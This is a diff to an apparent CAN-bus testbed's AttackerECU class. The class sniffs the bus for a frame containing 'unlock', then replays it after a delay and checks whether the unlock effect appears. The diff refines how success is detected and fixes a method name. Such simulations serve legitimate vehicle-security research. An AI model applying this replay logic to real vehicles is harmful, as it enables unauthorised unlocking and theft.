@@ -61,7 +61,9 @@ class AttackerECU(BaseECU):
         """
         msg_data = codecs.decode(msg.data, 'hex')
         for _ in re.finditer(b'unlock', msg_data, re.IGNORECASE):
-            self.replay_result.set()
+            # Check that this message is not the replayed message but one of its effects
+            if msg.arbitration_id != self.replay_msg[0] or msg_data != self.replay_msg[1]:
+                self.replay_result.set()
 
     def _get_replay_result(self) -> bool:
         """
@@ -85,7 +87,7 @@ class AttackerECU(BaseECU):
         # Listen to the bus to check whether the attack produces the desired effect
         self.replay_check_listener = self.listen_to_bus(self._look_for_unlock)
 
-    def _find_unlocking_frame_and_replay2(self, msg: can.Message):
+    def _find_unlocking_frame_and_replay(self, msg: can.Message):
         """
         Searches for a message on the bus containing 'unlock' in the data and when found replays the message.
         :param msg: The message read from the bus.
@@ -112,15 +114,17 @@ class AttackerECU(BaseECU):
         # Initialize the event used to know when the message to replay is found
         self.replay_result = threading.Event()
         # Start looking for the message to replay
-        self.replay_listener = self.listen_to_bus(self._find_unlocking_frame_and_replay2)
+        self.replay_listener = self.listen_to_bus(self._find_unlocking_frame_and_replay)
         # Wait for the message to replay to be found
         self.replay_result.wait()
+
+        # Wait for some time before performing the attack
+        time.sleep(5)
 
         # The message to replay has been found, then start checking for the attack's result
         self._check_replay_success()
 
-        # Replay the message (after some time)
-        time.sleep(5)
+        # Replay the message
         self.send_msg(self.replay_msg[0], self.replay_msg[1])
 
         # Get the attack's result
